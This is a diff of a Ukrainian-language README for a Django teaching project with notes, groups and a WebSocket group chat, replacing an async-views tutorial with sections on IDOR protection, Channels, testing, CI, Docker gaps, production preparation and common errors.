+| `EMAIL_BACKEND` | console backend для password reset у development |
+| `SESSION_COOKIE_HTTPONLY` | `True` |
+| `CSRF_COOKIE_HTTPONLY` | `False` |
+| `SESSION_COOKIE_SAMESITE` | `Lax` |
+| `X_FRAME_OPTIONS` | `DENY` |
+| `SECURE_CONTENT_TYPE_NOSNIFF` | `True` |
+
+## 19. Authorization і захист від IDOR
+
+Authorization - це відповідь на питання "що тобі дозволено?". `@login_required` перевіряє тільки authentication. Він не гарантує, що user має право бачити конкретну нотатку.
+
+IDOR - Insecure Direct Object Reference. Типовий приклад:
+
+```text
+Alice відкриває /notes/5/
+Bob змінює URL на /notes/6/
+Якщо note 6 належить Alice і код не перевіряє owner, Bob може побачити чужі дані.
+```
+
+У цьому проєкті захист реалізовано через:
+
+- `get_object_or_404(..., user=request.user)` для owner-only об'єктів;
+- `Q(user=request.user) | Q(group__in=user_groups)` для group-visible notes;
+- `shared_with` checks для todo/shopping direct sharing;
+- membership check у `group_chat`;
+- membership check у `GroupChatConsumer.connect()`.
+
+Важлива різниця:
+
+- читати group note може учасник group;
+- редагувати і видаляти чужу group note поточний code не дозволяє, якщо `note.user != request.user`.
+
+## 20. Груповий доступ
+
+Проєкт використовує built-in Django model `Group`.
+
+У цьому коді `Group` використовується не як permission system, а як domain object для sharing.
+
+Груповий сценарій:
+
+1. user створює group у `/groups/new/`;
+2. creator автоматично додається як перший member;
+3. у `/groups/<pk>/` можна додати інших users за username;
+4. note або shopping list може отримати `group`;
+5. members бачать group-owned notes/shopping lists;
+6. group має chat page `/groups/<pk>/chat/`.
+
+`TodoList` і `ShoppingList` також мають direct sharing через `shared_with`. Це окремий механізм: direct user-to-user доступ, не через group.
+
+## 21. WebSocket-чат і Django Channels
+
+Файли:
+
+- `notes_project/asgi.py`;
+- `notes_project/routing.py`;
+- `notes_app/consumers.py`;
+- `notes_app/models.py` -> `ChatMessage`;
+- `notes_app/templates/notes_app/group_chat.html`;
+- `notes_app/static/notes_app/js/group_chat.js`.
+
+HTTP і WebSocket працюють по-різному:
+
+| HTTP | WebSocket |
+| --- | --- |
+| request -> response -> connection closes | connection stays open |
+| browser ініціює кожен request | server теж може надсилати data |
+| view живе один request | Consumer живе поки socket відкритий |
+| підходить для HTML pages і forms | підходить для chat, notifications, live state |
+
+### 21.1. WebSocket flow
 
 ```mermaid
 sequenceDiagram
-    participant Browser as Браузер
-    participant ASGI as Uvicorn (ASGI)
-    participant EL as Event Loop
-    participant View as async_note_list()
-    participant Selector as async_selectors
-    participant DB as SQLite
+    participant B as Browser JS
+    participant A as ASGI app
+    participant R as URLRouter
+    participant C as GroupChatConsumer
+    participant L as Channel layer
+    participant DB as Database
 
-    Browser->>ASGI: GET /async/notes/
-    ASGI->>EL: Передає coroutine
-    EL->>View: Запускає async_note_list(request)
-    View->>Selector: async_get_user_notes(user) — lazy QuerySet
-    View->>DB: async for note in queryset (реальний SQL)
-    Note over EL: Event loop ВІЛЬНИЙ — обслуговує інші запити
-    DB-->>View: Рядки даних
-    View-->>ASGI: render(template, context)
-    ASGI-->>Browser: HTML 200 OK
+    B->>A: ws://host/ws/groups/7/chat/
+    A->>R: websocket route
+    R->>C: connect with group_pk=7
+    C->>DB: check group membership
+    C->>L: group_add chat_group_7
+    C-->>B: accept connection
+    C->>DB: load last 50 messages
+    C-->>B: history frames
+    B->>C: send JSON content
+    C->>DB: save ChatMessage
+    C->>L: group_send chat_message
+    L-->>C: deliver event to all subscribers
+    C-->>B: message frame
 ```
 
-### Async URL-и
+### 21.2. Що робить Consumer
 
-| URL | Метод | Async View | Sync-аналог |
-|-----|-------|-----------|-------------|
-| `/async/notes/` | GET | `async_note_list` | `note_list` |
-| `/async/notes/<pk>/` | GET | `async_note_detail` | `note_detail` |
-| `/async/notes/create/` | GET/POST | `async_note_create` | `note_create` |
-| `/async/notes/<pk>/delete/` | GET/POST | `async_note_delete` | `note_delete` |
-| `/async/notes/<pk>/pin/` | POST | `async_note_toggle_pin` | _(немає окремого URL)_ |
+`GroupChatConsumer`:
 
----
+- читає `scope['user']`;
+- відхиляє anonymous users;
+- читає `group_pk` з WebSocket URL;
+- перевіряє membership у group;
+- додає connection до channel layer group `chat_group_<pk>`;
+- приймає WebSocket;
+- надсилає останні 50 повідомлень;
+- приймає нові JSON messages;
+- зберігає `ChatMessage` у DB;
+- broadcast-ить message всім підписникам;
+- відписується при disconnect.
 
-## 05. Коли async виправданий, а коли — ні
+Django ORM синхронний. Тому consumer використовує `database_sync_to_async`, щоб ORM-запити виконувались не прямо в event loop.
 
-Async — це не "краще". Async — це "для іншого типу задач".
+## 22. JavaScript-клієнт чату
 
-### ❌ Async не потрібен (sync достатній)
+Файл: `notes_app/static/notes_app/js/group_chat.js`.
 
-| Функціонал | Чому sync вистачає |
-|------------|-------------------|
-| CRUD нотаток | Прості DB запити, один запит = одна відповідь |
-| TodoList, ShoppingList | Немає bottleneck, короткі запити |
-| Форми, авторизація | CPU-операції без I/O очікування |
-| Адмін-панель | Рідкісні складні запити, concurrency не потрібна |
+JavaScript:
 
-### ✅ Async виправданий
+- читає `data-group-pk` і `data-username` з `#chat-config`;
+- будує URL `ws://` або `wss://` залежно від `window.location.protocol`;
+- відкриває `new WebSocket(...)`;
+- показує статус: connecting, connected, disconnected, error;
+- блокує input до підключення;
+- приймає `history` і `message` frames;
+- додає chat bubbles у DOM;
+- екранує user content через `escapeHtml`;
+- має reconnect з exponential backoff і jitter.
 
-| Функціонал | Чому async потрібен |
-|------------|---------------------|
-| **Груповий чат (цей проєкт!)** | WebSocket = тисячі відкритих з'єднань одночасно |
-| Паралельні API-запити | `asyncio.gather()` → кілька запитів одночасно |
-| Streaming відповіді | Server-Sent Events, великі файли |
-| High-concurrency API | 10 000+ req/s без блокування потоків |
+Важлива security point: user-generated content не можна вставляти у `innerHTML` без escaping. У цьому коді `escapeHtml()` захищає chat від простого XSS.
 
-Якщо переписати весь проєкт в async без реального bottleneck — це
-overengineering + складніший код + ті самі результати.
+## 23. Sync, async, WSGI і ASGI
 
-**Ми конвертуємо тільки Notes** щоб студент міг порівняти архітектуру.
-**Груповий чат** — це окремий use case де async є єдиним правильним вибором (→ розділ 18).
+### 23.1. Sync Django
 
----
+Класичний Django CRUD у цьому проєкті реалізований sync views у `notes_app/views.py`.
 
-## 06. Запуск sync Django через runserver
+Sync request добре підходить для:
 
-### Крок 1: Перехід до директорії
+- CRUD;
+- server-rendered pages;
+- forms;
+- admin;
+- простих DB operations.
+
+### 23.2. ASGI
+
+ASGI - async-capable interface для Python web apps. Він потрібен для WebSocket, бо WebSocket connection живе довго.
+
+У `notes_project/asgi.py` використано:
+
+- `ProtocolTypeRouter`;
+- `ASGIStaticFilesHandler`;
+- `AuthMiddlewareStack`;
+- `URLRouter`;
+- `websocket_urlpatterns`.
+
+### 23.3. Поточний стан async HTTP demo
+
+Dependencies для async HTTP demo є (`uvicorn`, `httpx`), і `notes_app/urls.py` має async routes. Але відповідні `async_views.py`, `async_selectors.py`, `async_services.py` зараз відсутні у working tree.
+
+Тому у поточному стані треба розрізняти:
+
+- WebSocket async stack - присутній через `asgi.py`, `routing.py`, `consumers.py`;
+- async HTTP demo routes - оголошені, але не завершені у working tree.
+
+## 24. Тестування
+
+Тести живуть у `notes_app/tests/`.
+
+| Файл | Що тестує |
+| --- | --- |
+| `test_models.py` | models, validators, constraints, defaults |
+| `test_services.py` | business operations у services |
+| `test_forms.py` | validation і security filtering у forms |
+| `test_views.py` | HTTP views, redirects, access control |
+| `test_consumers.py` | WebSocket Consumer через Channels testing |
+| `test_selenium.py` | browser E2E flows, включно з chat page і WebSocket case |
+
+Перед тестами:
 
 ```bash
-cd module_5/lesson_Django_Async/notes_chat_app
+python manage.py check
+python manage.py migrate
 ```
 
-### Крок 2: Створення virtualenv
+Запуск усіх Django tests:
 
 ```bash
-# Створення virtualenv
-python -m venv .venv
+python manage.py test
+```
 
-# Активація (Linux / macOS)
+Окремі групи:
+
+```bash
+python manage.py test notes_app.tests.test_models -v 2
+python manage.py test notes_app.tests.test_services -v 2
+python manage.py test notes_app.tests.test_forms -v 2
+python manage.py test notes_app.tests.test_views -v 2
+python manage.py test notes_app.tests.test_consumers -v 2
+python manage.py test notes_app.tests.test_selenium -v 2
+```
+
+Coverage:
+
+```bash
+coverage run manage.py test
+coverage report --show-missing
+coverage xml -o coverage.xml
+```
+
+Під час аудиту команда `python3 manage.py check` у системному WSL Python не пройшла, бо Django не був встановлений у цьому середовищі. Це типовий симптом неактивованого venv або невстановлених dependencies:
+
+```text
+ModuleNotFoundError: No module named 'django'
+```
+
+## 25. GitHub Actions CI
+
+Файл: `.github/workflows/django-tests.yml`.
+
+Workflow має два jobs:
+
+| Job | Що робить |
+| --- | --- |
+| `unit-and-integration` | checkout, Python 3.12, install dependencies, `manage.py check`, unit/integration/consumer tests, coverage |
+| `selenium-e2e` | запускає Selenium E2E tests після unit/integration job |
+
+Triggers:
+
+- push у `main` або `master`;
+- pull request у `main` або `master`;
+- manual `workflow_dispatch`.
+
+CI використовує SQLite і `InMemoryChannelLayer`, якщо не задано `DATABASE_URL` і `REDIS_URL`.
+
+Практичний нюанс: workflow коментар містить старий GitHub Actions URL з попереднього навчального repo. Для цього окремого repo орієнтуйтесь на actual remote:
+
+```text
+https://github.com/NikoriakViktot/notes_chat_app
+```
+
+## 26. Docker, PostgreSQL і Redis
+
+У репозиторії є:
+
+- `Dockerfile`;
+- `docker-compose.yml`;
+- `entrypoint.sh`;
+- `.env.example`.
+
+Задумана архітектура:
+
+```mermaid
+flowchart LR
+    Browser["Browser"] --> Web["web: Django ASGI on 8001"]
+    Web --> Postgres["db: PostgreSQL 16"]
+    Web --> Redis["redis: Redis 7"]
+    Selenium["selenium: Chrome"] --> Web
+```
+
+`docker-compose.yml` описує services:
+
+| Service | Призначення |
+| --- | --- |
+| `db` | PostgreSQL 16 |
+| `redis` | Redis для Channels Redis channel layer |
+| `web` | Django/ASGI application |
+| `selenium` | standalone Chrome для browser tests |
+
+`entrypoint.sh`:
+
+```bash
+python manage.py migrate --noinput
+python manage.py collectstatic --noinput
+python -m uvicorn notes_project.asgi:application --host 0.0.0.0 --port 8001 --reload
+```
+
+### 26.1. Поточна Docker неузгодженість
+
+У поточних файлах є важлива проблема:
+
+- `docker-compose.yml` має `build: notes`;
+- `Dockerfile` має `COPY notes .`;
+- директорії `notes/` у корені репозиторію немає.
+
+Тому `docker compose up --build` у такому стані, ймовірно, не зможе зібрати image без виправлення build context і copy path.
+
+Типовий напрям виправлення:
+
+- у `docker-compose.yml` build context має вказувати на корінь репозиторію;
+- у `Dockerfile` треба копіювати фактичні файли репозиторію, а не неіснуючу директорію.
+
+Це свідомо описано як production/deployment gap, а не як готова інструкція.
+
+## 27. Підготовка до production
+
+Поточний проєкт є навчальним і development-oriented. Для production потрібна додаткова робота.
+
+### 27.1. Що вже є
+
+- Django settings файл;
+- static settings: `STATIC_URL`, `STATICFILES_DIRS`, `STATIC_ROOT`;
+- PostgreSQL selection через `DATABASE_URL`;
+- Redis channel layer через `REDIS_URL`;
+- security settings: `SESSION_COOKIE_HTTPONLY`, `SESSION_COOKIE_SAMESITE`, `X_FRAME_OPTIONS`, `SECURE_CONTENT_TYPE_NOSNIFF`;
+- Docker-related files як заготовка;
+- CI workflow як заготовка перевірок.
+
+### 27.2. Що треба доробити
+
+- винести `SECRET_KEY` з коду в environment;
+- поставити `DEBUG=False`;
+- налаштувати реальний `ALLOWED_HOSTS`;
+- увімкнути HTTPS settings: `SESSION_COOKIE_SECURE`, `CSRF_COOKIE_SECURE`, `SECURE_SSL_REDIRECT`, HSTS;
+- виправити Docker build context;
+- налаштувати production application server без `--reload`;
+- додати reverse proxy, наприклад Nginx;
+- виконувати `collectstatic`;
+- використовувати PostgreSQL з backup strategy;
+- використовувати Redis для Channels у multi-worker deployment;
+- налаштувати logging;
+- налаштувати monitoring;
+- додати секрети через environment або secret manager;
+- перевірити CI після виправлення async/Docker gaps.
+
+GitHub push не дорівнює deployment. GitHub зберігає код і запускає CI. Production server запускає application і обслуговує users.
+
+## 28. Основні URL
+
+| URL | Призначення |
+| --- | --- |
+| `/` | index |
+| `/register/` | registration |
+| `/accounts/login/` | login |
+| `/accounts/logout/` | logout |
+| `/accounts/password_change/` | password change |
+| `/accounts/password_reset/` | password reset |
+| `/admin/` | Django admin |
+| `/notes/` | notes list |
+| `/notes/new/` | create note |
+| `/notebooks/` | notebooks |
+| `/tags/new/` | create tag |
+| `/todo/` | todo lists |
+| `/shopping/` | shopping lists |
+| `/groups/` | groups |
+| `/groups/<pk>/chat/` | group chat page |
+| `/ws/groups/<pk>/chat/` | WebSocket endpoint |
+
+## 29. Типові помилки
+
+### 29.1. `No module named django`
+
+Симптом:
+
+```text
+ModuleNotFoundError: No module named 'django'
+```
+
+Причина: не активовано venv або не встановлено dependencies.
+
+Перевірка:
+
+```bash
+which python
+python -m pip show Django
+```
+
+Виправлення:
+
+```bash
 source .venv/bin/activate
-
-# Активація (Windows)
-.venv\Scripts\activate
-```
-
-### Крок 3: Встановлення залежностей
-
-```bash
 pip install -r requirements.txt
-# Встановить: Django 5.2, crispy-forms, uvicorn, httpx, та інші
 ```
 
-### Крок 4: Міграції
+### 29.2. `ImportError` або `cannot import name async_views`
+
+Симптом: Django падає при import `notes_app.urls`.
+
+Причина: `notes_app/urls.py` імпортує `async_views`, але async module files відсутні у working tree.
+
+Виправлення: відновити `notes_app/async_views.py`, `async_selectors.py`, `async_services.py`, або прибрати async routes/import з `notes_app/urls.py`.
+
+### 29.3. `no such table`
+
+Причина: migrations ще не застосовано.
 
 ```bash
 python manage.py migrate
-# Створить SQLite db.sqlite3 з усіма таблицями
 ```
 
-### Крок 5: Суперюзер (опційно)
+### 29.4. Port already in use
+
+Причина: інший process уже слухає порт `8000` або `8001`.
 
 ```bash
-python manage.py createsuperuser
-# Username: admin
-# Password: (введи свій)
-# → http://127.0.0.1:8000/admin/
+python manage.py runserver 8002
+uvicorn notes_project.asgi:application --reload --port 8002
 ```
 
-### Крок 6: Запуск sync сервера
+### 29.5. `DisallowedHost`
+
+Причина: `ALLOWED_HOSTS` не містить host. У поточному development settings стоїть `['*']`, але для production це треба замінити на конкретні hosts.
+
+### 29.6. `CSRF verification failed`
+
+Причина: POST form без `{% csrf_token %}` або неправильний CSRF setup для JS request.
+
+Перевірка: у form templates має бути `{% csrf_token %}`.
+
+### 29.7. `TemplateDoesNotExist`
+
+Причина: неправильний path до template або template не лежить у `templates/` чи `notes_app/templates/`.
+
+Перевірка:
+
+- `TEMPLATES["DIRS"]` містить `BASE_DIR / "templates"`;
+- `APP_DIRS=True`;
+- app template path має вигляд `notes_app/templates/notes_app/name.html`.
+
+### 29.8. `NoReverseMatch`
+
+Причина: неправильне URL name, namespace або args.
+
+Перевірка:
+
+- `app_name = "notes_app"` у `notes_app/urls.py`;
+- template uses `{% url 'notes_app:note_detail' note.pk %}`.
+
+### 29.9. WebSocket не підключається
+
+Можливі причини:
+
+- server запущено не через ASGI;
+- URL не `/ws/groups/<pk>/chat/`;
+- user не authenticated;
+- user не member group;
+- `ws://`/`wss://` не відповідає http/https сторінки;
+- Redis недоступний, якщо задано `REDIS_URL`;
+- browser console має JS error.
+
+Перевірка:
+
+- відкрийте DevTools -> Console;
+- відкрийте Network -> WS;
+- перевірте server logs;
+- спробуйте `uvicorn notes_project.asgi:application --reload --port 8001`.
+
+### 29.10. Docker build не знаходить `notes`
+
+Симптом: build падає через missing directory.
+
+Причина: у поточному Docker setup згадується директорія `notes/`, якої немає.
+
+Виправлення: привести `docker-compose.yml` і `Dockerfile` до фактичної структури репозиторію.
+
+## 30. Навчальний маршрут
+
+### Рівень 1. Запуск і структура
+
+Прочитати:
+
+- `manage.py`;
+- `notes_project/settings.py`;
+- `notes_project/urls.py`;
+- `notes_app/urls.py`.
+
+Запустити:
 
 ```bash
+python manage.py check
+python manage.py migrate
 python manage.py runserver
-# ↑ Django запускається на вбудованому WSGI сервері
-# Порт: 8000 (за замовчуванням)
 ```
 
-Відкрий браузер: **http://127.0.0.1:8000/**
+Контрольна перевірка: пояснити, чому `/notes/` відкриває саме `note_list`.
 
-Зареєструйся або логінься. Побач sync-список нотаток: **http://127.0.0.1:8000/notes/**
+### Рівень 2. Models і ORM
 
----
+Прочитати:
 
-## 07. Запуск async Django через Uvicorn (ASGI)
+- `notes_app/models.py`;
+- `notes_app/migrations/`.
 
-Uvicorn — ASGI-сервер. На відміну від вбудованого runserver, він використовує
-asyncio event loop і обслуговує async views нативно.
-
-### Крок 1: Встанови залежності (включно з wsproto)
+Запустити:
 
 ```bash
-pip install -r requirements.txt
+python manage.py shell
 ```
 
-> **Чому важливо:** `requirements.txt` містить `wsproto` — бібліотеку WebSocket-протоколу
-> для uvicorn. Без неї uvicorn логує `"No supported WebSocket library detected"` і повертає
-> HTTP 404 на всі WS-запити. Async views працюють, але **чат — не буде**.
+Спробувати створити user, notebook, note, tag через ORM.
 
-### Крок 2: Запусти ASGI-сервер
+Контрольна перевірка: пояснити різницю між FK, OneToOne і ManyToMany.
 
-```bash
-uvicorn notes_project.asgi:application --reload --port 8001
-```
+### Рівень 3. Views, selectors, services
 
-Розбір команди:
+Прочитати:
 
-| Частина | Що означає |
-|---------|-----------|
-| `uvicorn` | ASGI-сервер (аналог gunicorn для async) |
-| `notes_project.asgi` | Python module: `notes_project/asgi.py` |
-| `:application` | Об'єкт у модулі (`application = ProtocolTypeRouter(...)`) |
-| `--reload` | Автоперезапуск при зміні файлів (тільки для dev!) |
-| `--port 8001` | Порт 8001 (8000 зайнятий runserver) |
+- `notes_app/views.py`;
+- `notes_app/selectors.py`;
+- `notes_app/services.py`.
 
-### Очікуване попередження (НЕ є помилкою)
+Контрольна перевірка: показати, де саме виконується SELECT, а де INSERT/UPDATE/DELETE.
 
-```
-WARNING:  ASGI 'lifespan' protocol appears unsupported.
-```
+### Рівень 4. Forms і templates
 
-Uvicorn пробує lifespan protocol (startup/shutdown хуки) → Django не реалізує його →
-uvicorn логує WARNING і продовжує роботу. Це нормально. Чат і async views працюють
-повністю. Ігноруй це повідомлення.
+Прочитати:
 
-Відкрий браузер: **http://127.0.0.1:8001/**
+- `notes_app/forms.py`;
+- `templates/base.html`;
+- `templates/layouts/dashboard.html`;
+- `notes_app/templates/notes_app/note_form.html`.
 
-Тепер ти можеш порівняти:
-- **http://127.0.0.1:8000/notes/** — sync view (WSGI)
-- **http://127.0.0.1:8001/async/notes/** — async view (ASGI)
-- **http://127.0.0.1:8001/groups/** — груповий чат (WebSocket)
+Контрольна перевірка: пояснити, чому `NoteForm` отримує `user`.
 
-> **Важливо:** Обидва сервери підключаються до ОДНОГО `db.sqlite3`.
-> Дані — ті самі. Архітектура виконання — різна.
+### Рівень 5. Authentication і permissions
 
----
+Прочитати:
 
-## 08. Таблиця порівняння URL-ів
+- `notes_app/views.py`;
+- `templates/registration/`;
+- `notes_project/settings.py`.
 
-| Sync URL | Async URL | Що порівнюємо |
-|----------|-----------|---------------|
-| `GET /notes/` | `GET /async/notes/` | Список нотаток, lazy ORM vs async for |
-| `GET /notes/<pk>/` | `GET /async/notes/<pk>/` | Деталі нотатки, `.get()` vs `.aget()` |
-| `GET/POST /notes/new/` | `GET/POST /async/notes/create/` | Форма + `create_note` vs `sync_to_async` |
-| `GET/POST /notes/<pk>/delete/` | `GET/POST /async/notes/<pk>/delete/` | `.delete()` vs `.adelete()` |
-| _(немає окремого URL)_ | `POST /async/notes/<pk>/pin/` | `.update(F(...))` vs `.aupdate(F(...))` |
+Контрольна перевірка: пояснити різницю між login і правом редагувати конкретний object.
 
----
+### Рівень 6. Tests і CI
 
-## 09. Як працює async_selectors.py
+Прочитати:
 
-Відкрий файл: `hello_app/async_selectors.py`
+- `notes_app/tests/`;
+- `.github/workflows/django-tests.yml`.
 
-Порівняй із оригінальним: `hello_app/selectors.py`
-
-### Ключова ідея: lazy vs evaluation
-
-```python
-# selectors.py (sync) — оригінал
-def get_user_notes(user, ...):
-    qs = Note.objects.filter(Q(user=user) | ...)
-    qs = qs.select_related('notebook', 'group')
-    qs = qs.prefetch_related('tags')
-    return qs.order_by('-is_pinned', ...)
-    # ↑ SQL ЩЕ НЕ ВИКОНУВАВСЯ — повертає lazy QuerySet
-    # SQL виконується у views.py коли: for note in notes: ...
-```
-
-```python
-# async_selectors.py — async версія
-def async_get_user_notes(user, ...):
-    qs = Note.objects.filter(Q(user=user) | ...)
-    qs = qs.select_related('notebook', 'group')
-    qs = qs.prefetch_related('tags')
-    return qs.order_by('-is_pinned', ...)
-    # ↑ ТА САМА ЛОГІКА — теж lazy QuerySet
-    # SQL виконується у async_views.py коли: async for note in notes_qs: ...
-```
-
-| Django ORM метод | Тип | SQL виконується? |
-|-----------------|-----|-----------------|
-| `.filter(...)` | Lazy | ❌ Ні |
-| `.select_related(...)` | Lazy | ❌ Ні |
-| `.prefetch_related(...)` | Lazy | ❌ Ні |
-| `.annotate(...)` | Lazy | ❌ Ні |
-| `.order_by(...)` | Lazy | ❌ Ні |
-| `.get()` | Eval | ✅ Так (sync — блокує) |
-| `.aget()` | Eval | ✅ Так (async — не блокує) |
-| `.count()` | Eval | ✅ Так (sync) |
-| `.acount()` | Eval | ✅ Так (async) |
-| `for obj in qs` | Eval | ✅ Так (sync — блокує) |
-| `async for obj in qs` | Eval | ✅ Так (async — не блокує) |
-
-### async def тільки там де є реальний SQL
-
-```python
-# async_get_user_notes — звичайна def (lazy QuerySet, SQL не виконується)
-def async_get_user_notes(user, ...):
-    return Note.objects.filter(...).select_related(...).order_by(...)
-
-# async_get_note_detail — async def (реальний SQL через .aget())
-async def async_get_note_detail(user, note_id):
-    return await Note.objects.filter(...).select_related(...).aget(id=note_id)
-    #      ↑ await: SQL виконується асинхронно, event loop вільний поки чекаємо
-```
-
----
-
-## 10. Як працює async_services.py
-
-Відкрий файл: `hello_app/async_services.py`
-
-Порівняй із оригінальним: `hello_app/services.py`
-
-### Два підходи: sync_to_async vs native async
-
-```python
-# services.py (sync) — оригінал
-def create_note(*, user, title, ...):
-    with transaction.atomic():         # ← транзакція
-        note = Note.objects.create(...)
-        note.tags.set(valid_tags)
-    return note
-```
-
-```python
-# async_services.py — async через sync_to_async
-# Не можна просто зробити async def через transaction.atomic()
-async_create_note = sync_to_async(create_note, thread_sensitive=True)
-# ↑ Обгортає sync create_note для безпечного виклику з async view
-# sync_to_async запускає create_note у виділеному OS-потоці
-# event loop вільний поки потік виконує транзакцію
-```
-
-Порівняй три підходи в async_services.py:
-
-| Операція | Підхід | Чому |
-|----------|--------|------|
-| `async_create_note` | `sync_to_async(create_note)` | `transaction.atomic()` не підтримується natively async |
-| `async_delete_note` | `await note.adelete()` | Простий DELETE, native async ORM метод |
-| `async_toggle_pin_note` | `await qs.aupdate(is_pinned=~F(...))` | Атомарний UPDATE, native async, без завантаження об'єкта |
-
-### sync_to_async: як це виглядає в пам'яті
-
-```
-Async View (event loop thread)
-    │
-    │  await async_create_note(...)       ← view призупиняється
-    │
-    ├─→ sync_to_async: передає у worker thread
-    │
-    │  event loop обслуговує ІНШІ запити ←
-    │
-    │  Worker Thread: виконує create_note() + transaction.atomic()
-    │
-    │  Worker Thread: повертає note ─────┐
-    │                                     │
-    │  event loop відновлює view ─────────┘
-    │
-    └─→ note = <Note object>  ← view продовжується
-```
-
----
-
-## 11. Як працює async_views.py
-
-Відкрий файл: `hello_app/async_views.py`
-
-Порівняй із оригінальним: `hello_app/views.py`
-
-### Ключові синтаксичні відмінності
-
-```python
-# views.py (sync) — оригінал
-@login_required
-def note_list(request):
-    notes = selectors.get_user_notes(request.user)        # lazy QuerySet
-    # Рядком нижче template evaluate QuerySet через for loop (sync)
-    return render(request, 'hello_app/note_list.html', {'notes': notes})
-```
-
-```python
-# async_views.py — async версія
-async def async_note_list(request):
-    if not request.user.is_authenticated:         # явна auth перевірка
-        return redirect('login')
-
-    notes_qs = async_selectors.async_get_user_notes(request.user)  # lazy (sync def)
-
-    notes = [note async for note in notes_qs]     # async for → SQL виконується тут
-    #        ↑ await відбувається всередині async for
-    #          event loop вільний поки DB відповідає
-
-    return render(request, 'hello_app/note_list.html', {'notes': notes})
-    #     ↑ render() — sync, але безпечна у async def (Django 5.x)
-```
-
-### Де стоять `await`-и і чому
-
-| Рядок | await | Навіщо |
-|-------|-------|--------|
-| `note = await async_selectors.async_get_note_detail(...)` | ✅ | Всередині aget() — реальний SQL |
-| `notes = [note async for note in notes_qs]` | ✅ (implicit) | Ітерація по QuerySet = SQL |
-| `note = await async_services.async_create_note(...)` | ✅ | sync_to_async — виконується у потоці |
-| `await async_services.async_delete_note(note)` | ✅ | adelete() — реальний SQL |
-| `await async_services.async_toggle_pin_note(note)` | ✅ | aupdate() — реальний SQL |
-| `form = NoteForm(request.POST, user=request.user)` | ❌ | Форма lazy, без важкого I/O |
-| `form.is_valid()` | ❌ | CPU-валідація, без I/O |
-| `return render(...)` | ❌ | Django 5.x рендерить sync template безпечно |
-| `return redirect(...)` | ❌ | Просто HttpResponse з 302, без I/O |
-
----
-
-## 12. Тести: sync vs async
-
-### Запуск тестів
+Запустити:
 
 ```bash
-# Тільки оригінальні sync тести (129 тестів)
-python manage.py test hello_app.tests.test_views -v 2
-
-# Тільки нові async тести
-python manage.py test hello_app.tests.test_async_views -v 2
-
-# Всі тести разом (sync + async)
-python manage.py test hello_app -v 1
-
-# Конкретний async клас
-python manage.py test hello_app.tests.test_async_views.AsyncNoteListViewTest -v 2
-
-# Зупинитись на першому провалі
-python manage.py test hello_app --failfast -v 2
+python manage.py test notes_app.tests.test_models -v 2
+python manage.py test notes_app.tests.test_views -v 2
 ```
 
-### Ключові відмінності async тестів
+Контрольна перевірка: пояснити різницю між unit, integration і E2E test.
 
-Відкрий поруч:
-- `hello_app/tests/test_views.py` — sync тести (NoteListViewTest)
-- `hello_app/tests/test_async_views.py` — async тести (AsyncNoteListViewTest)
+### Рівень 7. WebSocket і ASGI
 
-```python
-# test_views.py — sync тест
-class NoteListViewTest(TestCase):
+Прочитати:
 
-    def setUp(self):
-        # Sync ORM — завжди ОК у setUp
-        self.alice = User.objects.create_user('alice', password='pass123')
+- `notes_project/asgi.py`;
+- `notes_project/routing.py`;
+- `notes_app/consumers.py`;
+- `notes_app/static/notes_app/js/group_chat.js`;
+- `notes_app/templates/notes_app/group_chat.html`.
 
-    def test_redirects_to_login(self):
-        # Sync HTTP request
-        response = self.client.get(reverse('hello_app:note_list'))
-        self.assertEqual(response.status_code, 302)
-
-    def test_auth_user_gets_200(self):
-        self.client.force_login(self.alice)   # sync login
-        response = self.client.get(reverse('hello_app:note_list'))
-        self.assertEqual(response.status_code, 200)
-```
-
-```python
-# test_async_views.py — async тест
-class AsyncNoteListViewTest(TestCase):  # TestCase (не AsyncTestCase)
-
-    def setUp(self):
-        # setUp — sync, ORM без await — ОК
-        self.alice = User.objects.create_user('alice_async', password='pass123')
-
-    async def test_redirects_to_login(self):
-        client = AsyncClient()                  # AsyncClient замість self.client
-        response = await client.get(            # await client.get()
-            reverse('hello_app:async_note_list')
-        )
-        self.assertEqual(response.status_code, 302)
-
-    async def test_auth_user_gets_200(self):
-        client = AsyncClient()
-        await client.force_login(self.alice)    # await force_login
-        response = await client.get(
-            reverse('hello_app:async_note_list')
-        )
-        self.assertEqual(response.status_code, 200)
-```
-
-| Концепція | Sync тест | Async тест |
-|-----------|-----------|------------|
-| Базовий клас | `TestCase` | `TestCase` (те саме!) |
-| setUp | `def setUp(self)` | `def setUp(self)` (sync!) |
-| test_ методи | `def test_*(self)` | `async def test_*(self)` |
-| HTTP клієнт | `self.client` | `AsyncClient()` |
-| GET запит | `self.client.get(url)` | `await client.get(url)` |
-| Login | `self.client.force_login(user)` | `await client.force_login(user)` |
-| ORM у тесті | `Note.objects.create(...)` | `await sync_to_async(Note.objects.create)(...)` |
-
-> **Чому TestCase, а не AsyncTestCase?**
-> `AsyncTestCase` — підклас `SimpleTestCase` і не підтримує транзакції.
-> `TestCase` обгортає кожен тест у транзакцію (rollback після тесту).
-> Django 4.1+ підтримує `async def test_*` у звичайному `TestCase`.
-> Тому ми використовуємо `TestCase` з `async def test_*` методами.
-
----
-
-## 13. Postman / браузер: як тестувати
-
-### 13.1. Тестування в браузері
-
-**Крок 1:** Запусти обидва сервери одночасно
-
-```bash
-# Terminal 1 (sync)
-python manage.py runserver
-
-# Terminal 2 (async)
-uvicorn notes_project.asgi:application --reload --port 8001
-```
-
-**Крок 2:** Зареєструйся або логінься на http://127.0.0.1:8000/
-
-**Крок 3:** Відкрий обидва URL-и в різних вкладках
-
-```
-Вкладка 1: http://127.0.0.1:8000/notes/           ← sync
-Вкладка 2: http://127.0.0.1:8001/async/notes/     ← async
-```
-
-**Крок 4:** Створи нотатку через sync (/notes/new/) і перевір що вона видна в async (/async/notes/).
-
-> Обидва сервери підключаються до одного db.sqlite3 — дані спільні.
-
-### 13.2. Тестування в Postman
-
-> **Що таке CSRF token?**
-> CSRF (Cross-Site Request Forgery) — захист від підробки запитів між сайтами.
-> Django перевіряє спеціальний токен у кожному POST-запиті.
-> Браузер отримує токен автоматично через cookie. Postman — треба вручну.
-
----
-
-**Крок 1:** Отримай CSRF token через GET-запит в Postman
-
-Django встановлює `csrftoken` cookie при першому GET-запиті до будь-якої сторінки.
-
-```
-GET http://127.0.0.1:8000/
-```
-
-У відповіді Postman покаже вкладку **Cookies**:
-- Знайди cookie з назвою `csrftoken`
-- Скопіюй її значення (довгий рядок із букв та цифр)
-
-Або через браузер (якщо вже відкрито):
-- F12 → Application → Cookies → http://127.0.0.1:8000
-- Скопіюй значення `csrftoken`
-
-> Django автоматично включає cookie manager в Postman (Settings → Cookies).
